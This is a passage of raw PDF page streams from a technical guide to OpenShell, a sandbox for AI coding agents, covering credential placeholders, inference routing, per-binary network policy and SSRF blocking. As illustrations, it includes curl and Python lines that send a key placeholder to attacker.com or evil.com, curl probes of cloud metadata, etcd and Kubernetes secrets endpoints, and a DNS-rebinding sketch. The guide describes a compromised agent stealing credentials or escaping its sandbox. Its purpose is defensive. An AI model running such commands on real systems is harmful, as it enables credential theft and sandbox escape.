+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(  client = OpenAI\(base_url="https://inference.local/v1"\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(  response = client.chat.completions.create\(model="gpt-4", ...\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(What actually happens:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(  Agent ? CONNECT inference.local:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(       ? Proxy intercepts \(special case, bypasses OPA\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(       ? TLS terminate with sandbox CA cert for "inference.local") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(       ? Parse HTTP request: POST /v1/chat/completions) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(       ? Match against configured inference routes) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(       ? Strip agent's auth headers) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(       ? Inject real API key \(from provider config\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(       ? Rewrite "model" field in JSON body if needed) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(       ? Forward to real api.openai.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(       ? Stream response back to agent) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 544 Tm
+(Why two layers? The placeholder system handles arbitrary API keys in environment) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 529 Tm
+(variables. The inference router goes further ? the agent doesn't even need to know which) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 514 Tm
+(inference provider is being used. You could switch from OpenAI to Anthropic to a local) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 499 Tm
+(Ollama instance without changing the agent's code at all.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 474 Tm
+(Example Scenarios) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 451 Tm
+(Scenario 1: Agent tries to read its own API key) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 426 Tm
+(# Inside sandbox:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 414 Tm
+($ echo $ANTHROPIC_API_KEY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 402 Tm
+(openshell:resolve:env:ANTHROPIC_API_KEY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 378 Tm
+($ cat /proc/self/environ | tr '\\0' '\\n' | grep ANTHROPIC) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 366 Tm
+(ANTHROPIC_API_KEY=openshell:resolve:env:ANTHROPIC_API_KEY) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 346 Tm
+(The agent sees only the placeholder. The real key sk-ant-... exists only in the proxy) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 331 Tm
+(process's memory, which is outside the sandbox's network namespace and PID namespace.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 306 Tm
+(Scenario 2: Agent tries to exfiltrate the placeholder) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 281 Tm
+($ curl -H "Authorization: Bearer openshell:resolve:env:ANTHROPIC_API_KEY" \\) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 269 Tm
+(    https://attacker.com/steal) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 249 Tm
+(The proxy checks OPA policy: attacker.com is not an allowed endpoint ? DENY. The) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 234 Tm
+(placeholder never reaches the attacker. Even if the attacker's host were somehow) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 219 Tm
+(allowed, the proxy only performs credential substitution for configured provider hosts ?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 204 Tm
+(sending to an unknown host would forward the raw placeholder string, which is useless.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 179 Tm
+(Scenario 3: Switching inference providers without agent changes) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 154 Tm
+(# config: route inference.local to Anthropic instead of OpenAI) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 142 Tm
+(providers:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 130 Tm
+(  anthropic:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 118 Tm
+(    api_key: "sk-ant-real-key") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 106 Tm
+(    endpoint: "https://api.anthropic.com") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 94 Tm
+(    auth_style: custom  # Uses x-api-key header instead of Bearer) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 7 of 19) Tj
+ET
+endstream
+endobj
+11 0 obj
+<< /Length 3377 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 724 Tm
+(The agent code still calls https://inference.local/v1/chat/completions. The router) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 709 Tm
+(strips the agent's auth headers, injects x-api-key: sk-ant-real-key, and forwards to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 694 Tm
+(api.anthropic.com. The agent never knew the switch happened.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 669 Tm
+(Why This Matters) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 646 Tm
+(Credential theft is the #1 risk with AI agents. A compromised or manipulated agent with) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 631 Tm
+(access to real API keys can:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 606 Tm
+(- Exfiltrate keys to an attacker who uses them independently) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 585 Tm
+(- Make unauthorized API calls \(fine-tuning, file uploads, account management\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 564 Tm
+(- Pivot to other services using shared credentials) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 543 Tm
+(- Run up massive API bills) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 522 Tm
+(By ensuring the agent never possesses real credentials, OpenShell makes credential) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 507 Tm
+(exfiltration impossible ? even if the agent is fully compromised, the attacker gets only) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 492 Tm
+(worthless placeholder strings.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 461 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 443 Tm
+(3. Per-Binary Network Policy) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 415 Tm
+(The Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 392 Tm
+(An AI coding agent doesn't run as a single binary. A typical agent session spawns a tree) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 377 Tm
+(of processes:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 352 Tm
+(bash \(shell\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 340 Tm
+(??? node /usr/local/bin/claude    \(the AI agent\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 328 Tm
+(?   ??? node \(child worker\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 316 Tm
+(?   ??? git push origin main      \(git operations\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 304 Tm
+(?   ??? curl https://...          \(HTTP requests\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 292 Tm
+(?   ??? python script.py          \(running user code\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 280 Tm
+(?       ??? python -c "import requests; requests.post\('https://evil.com', ...\)") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 260 Tm
+(With per-agent-only network policy \(what Guardian Shell does\), all these processes share) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 245 Tm
+(the same network permissions. If node is allowed to reach api.openai.com:443, then) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 230 Tm
+(python script.py ? which could be untrusted user-generated code ? also gets that access.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 205 Tm
+(Key Concept: Process Identity Binding) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 182 Tm
+(OpenShell's proxy identifies which specific binary made each network connection by) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 167 Tm
+(inspecting the Linux /proc filesystem. For every CONNECT request, the proxy:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 142 Tm
+(1. Finds the socket owner: Reads /proc/{pid}/net/tcp to find which process) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 121 Tm
+(owns the TCP connection based on the source port) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 96 Tm
+(2. Reads the binary path: readlink /proc/{pid}/exe gives the absolute path) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 8 of 19) Tj
+ET
+endstream
+endobj
+12 0 obj
+<< /Length 3214 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 726 Tm
+(to the executable \(not the command name, which is spoofable\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 701 Tm
+(3. Computes the binary hash: SHA256 of the binary file for integrity) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 680 Tm
+(4. Walks the ancestor chain: Reads PPid from /proc/{pid}/status upward,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 659 Tm
+(collecting every ancestor binary up to the sandbox entrypoint) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 634 Tm
+(5. Collects cmdline paths: Parses /proc/{pid}/cmdline for script detection) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 613 Tm
+(\(e.g., node /usr/local/bin/claude ? exe is node, but the script path reveals it's) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 598 Tm
+(Claude\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 573 Tm
+(Important security decision: cmdline paths are collected for logging only. The Rego) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 558 Tm
+(policy rules intentionally exclude them from grant-access matching because argv[0] is) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 543 Tm
+(trivially spoofable via execve\(\). Only the /proc/{pid}/exe path \(a kernel-maintained) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 528 Tm
+(symlink that cannot be faked\) is used for policy decisions.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 503 Tm
+(How Policy Matching Works) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 480 Tm
+(network_policies:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 468 Tm
+(  allow-inference:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 456 Tm
+(    endpoints:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 444 Tm
+(      - host: "api.anthropic.com") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 432 Tm
+(        port: 443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 420 Tm
+(    binaries:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 408 Tm
+(      - path: "/usr/local/bin/claude"    # Exact path match) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 396 Tm
+(      - path: "/usr/bin/node"            # Node.js runtime) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 372 Tm
+(  allow-package-registry:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 360 Tm
+(    endpoints:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 348 Tm
+(      - host: "registry.npmjs.org") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 336 Tm
+(        port: 443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 324 Tm
+(    binaries:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 312 Tm
+(      - path: "/usr/bin/npm") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 300 Tm
+(      - path: "/usr/lib/node_modules/**"  # Glob pattern) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 276 Tm
+(  allow-git:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 264 Tm
+(    endpoints:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 252 Tm
+(      - host: "github.com") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 240 Tm
+(        port: 443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 228 Tm
+(    binaries:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 216 Tm
+(      - path: "/usr/bin/git") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 204 Tm
+(      - path: "/usr/lib/git-core/*"       # Git helper binaries) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 184 Tm
+(Matching algorithm \(evaluated in Rego\):) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 159 Tm
+(1. Exact path match: /usr/bin/git matches only /usr/bin/git) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 138 Tm
+(2. Ancestor path match: If the calling binary is /usr/bin/node but the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 117 Tm
+(policy specifies /usr/local/bin/claude, the proxy checks if claude is an ancestor in the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 102 Tm
+(process tree) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 9 of 19) Tj
+ET
+endstream
+endobj
+13 0 obj
+<< /Length 3163 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 722 Tm
+(3. Glob pattern match: glob.match\("/usr/lib/node_modules/**", ["/"], binary_path\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 701 Tm
+(Example Scenarios) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 678 Tm
+(Scenario 1: Agent's git subprocess pushes to GitHub) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 653 Tm
+(Process tree:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 641 Tm
+(  node /usr/local/bin/claude) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 629 Tm
+(    ??? git push origin main) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 617 Tm
+(            ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 605 Tm
+(            ??? CONNECT github.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 581 Tm
+(Proxy identity check:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 569 Tm
+(  binary_path: /usr/bin/git) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 557 Tm
+(  ancestors: [/usr/bin/node, /usr/local/bin/claude, /usr/bin/bash]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 533 Tm
+(OPA evaluation:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 521 Tm
+(  "allow-git" policy: host=github.com ?, port=443 ?, binary=/usr/bin/git ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 509 Tm
+(  ? ALLOW) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 489 Tm
+(Scenario 2: User-generated Python script tries to call GitHub) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 464 Tm
+(Process tree:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 452 Tm
+(  node /usr/local/bin/claude) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 440 Tm
+(    ??? python script.py) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 428 Tm
+(            ??? python -c "requests.get\('https://github.com/...'\)") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 416 Tm
+(                    ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 404 Tm
+(                    ??? CONNECT github.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 380 Tm
+(Proxy identity check:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 368 Tm
+(  binary_path: /usr/bin/python3) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 356 Tm
+(  ancestors: [/usr/bin/python3, /usr/bin/node, /usr/local/bin/claude, /usr/bin/bash]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 332 Tm
+(OPA evaluation:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 320 Tm
+(  "allow-git" policy: host=github.com ?, port=443 ?, binary=/usr/bin/python3 ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 308 Tm
+(    \(policy requires /usr/bin/git or /usr/lib/git-core/*\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 296 Tm
+(  ? DENY) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 276 Tm
+(The Python script is denied even though it's running inside the same sandbox as git. The) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 261 Tm
+(proxy sees that the actual binary making the connection is python3, not git.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 236 Tm
+(Scenario 3: Agent runs curl to download a package) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 211 Tm
+(Proxy identity check:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 199 Tm
+(  binary_path: /usr/bin/curl) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 187 Tm
+(  CONNECT registry.npmjs.org:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 163 Tm
+(OPA evaluation:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 151 Tm
+(  "allow-package-registry" policy: host ?, port ?, binary=/usr/bin/curl ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 139 Tm
+(    \(policy requires /usr/bin/npm or /usr/lib/node_modules/**\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 127 Tm
+(  ? DENY) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 107 Tm
+(Even curl ? a legitimate tool ? is denied access to npm because the policy says only npm) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 10 of 19) Tj
+ET
+endstream
+endobj
+14 0 obj
+<< /Length 3266 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(itself should talk to the registry. This prevents agents from using alternative tools to) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(bypass policy restrictions.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 692 Tm
+(Why This Matters) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 669 Tm
+(Without per-binary policy, a sandbox is only as secure as the least trusted process) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 654 Tm
+(inside it. User-generated code \(scripts the agent writes and runs\) shares the same) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 639 Tm
+(network access as the agent itself. Per-binary policy creates internal segmentation) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 624 Tm
+(within the sandbox:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 599 Tm
+(- The AI agent binary can call inference APIs) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 578 Tm
+(- Git can call GitHub) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 557 Tm
+(- npm can call the npm registry) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 536 Tm
+(- User-generated scripts cannot call anything) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 515 Tm
+(This is the principle of least privilege applied at the process level within an) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 500 Tm
+(already-sandboxed environment.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 469 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 451 Tm
+(4. SSRF Prevention) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 423 Tm
+(The Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 400 Tm
+(Server-Side Request Forgery \(SSRF\) tricks a server \(or in this case, a proxy\) into) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 385 Tm
+(making requests to internal/private network resources that shouldn't be externally) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 370 Tm
+(accessible.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 345 Tm
+(An AI agent in a sandbox might attempt:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 320 Tm
+(# Direct internal access) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 308 Tm
+(curl http://169.254.169.254/latest/meta-data/    # AWS metadata \(IAM credentials\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 296 Tm
+(curl http://10.0.0.1:2379/v2/keys/               # etcd \(Kubernetes secrets\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 284 Tm
+(curl http://localhost:6443/api/v1/secrets          # Kubernetes API) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 260 Tm
+(# DNS rebinding: attacker controls DNS for evil.com) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 248 Tm
+(# First resolution: evil.com ? 1.2.3.4 \(public, passes policy check\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 236 Tm
+(# Second resolution: evil.com ? 169.254.169.254 \(private, SSRF!\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 216 Tm
+(Since OpenShell runs inside a Docker container with K3s, internal services like etcd and) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 201 Tm
+(the Kubernetes API are on the same network. An agent that can reach these can read) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 186 Tm
+(secrets, modify cluster state, or escape the sandbox entirely.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 161 Tm
+(Key Concept: Three-Tier IP Filtering) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 138 Tm
+(OpenShell implements three tiers of IP address validation, checked after DNS resolution) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 123 Tm
+(but before the TCP connection is established:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 98 Tm
+(Tier 1: Always Blocked \(cannot be overridden\)) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 11 of 19) Tj
+ET
+endstream
+endobj
+15 0 obj
+<< /Length 3760 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(??? 127.0.0.0/8       \(loopback\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(??? ::1                \(IPv6 loopback\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(??? 169.254.0.0/16     \(link-local, AWS/GCP metadata\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(??? fe80::/10          \(IPv6 link-local\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(??? 0.0.0.0            \(unspecified\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(??? ::                 \(IPv6 unspecified\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(??? IPv4-mapped IPv6   \(::ffff:127.0.0.1 ? unwrapped and checked\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(Tier 2: Default Blocked \(private ranges\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(??? 10.0.0.0/8         \(RFC 1918\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(??? 172.16.0.0/12      \(RFC 1918\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(??? 192.168.0.0/16     \(RFC 1918\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(??? fc00::/7           \(IPv6 unique local\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(Tier 3: Control Plane Ports \(always blocked on any IP\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(??? 2379               \(etcd client\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 540 Tm
+(??? 2380               \(etcd peer\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 528 Tm
+(??? 6443               \(Kubernetes API\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 516 Tm
+(??? 10250              \(kubelet\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 504 Tm
+(??? 10255              \(kubelet read-only\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 484 Tm
+(Key Concept: DNS Resolution Timing) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 461 Tm
+(The order of operations is critical for preventing DNS rebinding attacks:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 436 Tm
+(1. Agent: CONNECT evil.com:443) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 424 Tm
+(2. Proxy: OPA policy check \(L4\) ? ALLOW \(evil.com is in allowed hosts\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 412 Tm
+(3. Proxy: DNS resolve evil.com ? [169.254.169.254]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 400 Tm
+(4. Proxy: IP check ? 169.254.169.254 is in Tier 1 \(link-local\) ? DENY) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 388 Tm
+(5. Agent: receives 403 Forbidden) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 368 Tm
+(The DNS resolution happens after policy evaluation but before the TCP connection is) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 353 Tm
+(established. The proxy resolves the hostname, checks every returned IP address against) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 338 Tm
+(all three tiers, and only proceeds if all IPs pass.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 313 Tm
+(This prevents DNS rebinding because the proxy resolves once and checks the result. The) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 298 Tm
+(classic DNS rebinding attack \(where a second resolution returns a different IP\) doesn't) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 283 Tm
+(work because the proxy uses the resolved IP directly for the connection ? there is no) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 268 Tm
+(second resolution.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 243 Tm
+(Key Concept: allowed_ips Override) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 220 Tm
+(Sometimes agents legitimately need to reach private IPs \(e.g., a local inference) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 205 Tm
+(server\). The allowed_ips policy field creates controlled exceptions:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 180 Tm
+(network_policies:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 168 Tm
+(  allow-local-inference:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 156 Tm
+(    endpoints:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 144 Tm
+(      - host: "inference.internal") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 132 Tm
+(        port: 8080) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 120 Tm
+(        allowed_ips: ["10.86.8.0/24"]    # Only this subnet) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 100 Tm
+(When allowed_ips is set, the proxy validates resolved IPs against the allowlist instead) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 12 of 19) Tj
+ET
+endstream
+endobj
+16 0 obj
+<< /Length 3186 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(of the default private-range block. Tier 1 \(always blocked\) addresses cannot be) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(overridden even with allowed_ips.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 692 Tm
+(Broad CIDRs trigger a warning: anything wider than /16 \(65,536+ addresses\) is flagged as) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 677 Tm
+(potentially dangerous.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 652 Tm
